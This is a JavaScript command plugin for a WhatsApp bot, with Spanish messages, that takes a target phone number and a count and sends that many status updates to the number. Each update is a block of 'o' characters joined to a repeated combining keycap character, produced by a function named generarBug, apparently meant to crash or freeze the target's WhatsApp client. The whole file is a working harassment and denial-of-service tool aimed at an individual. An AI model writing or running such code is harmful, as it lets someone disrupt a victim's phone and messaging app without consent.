let handler = async (m, { conn, text }) => {
  if (!text) throw 'Ejemplo:\n.estado +521234567890/10'

  let [num, count] = text.split('/')
  let numero = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let cantidad = parseInt(count)

  if (isNaN(cantidad) || cantidad < 1) throw 'Cantidad inválida'

  function generarBug() {
    let base = 'o\u20E3'
    let linea = base.repeat(120)
    return (linea + '\n').repeat(8)
  }

  for (let i = 0; i < cantidad; i++) {

    await conn.sendMessage(
      'status@broadcast',
      {
        text: generarBug()
      },
      {
        statusJidList: [numero] // 🔥 ESTO ES LA CLAVE
      }
    )

    await new Promise(r => setTimeout(r, 2000))
  }

  m.reply(`✅ ${cantidad} estados enviados`)
}

handler.command = ['estado']
export default handler
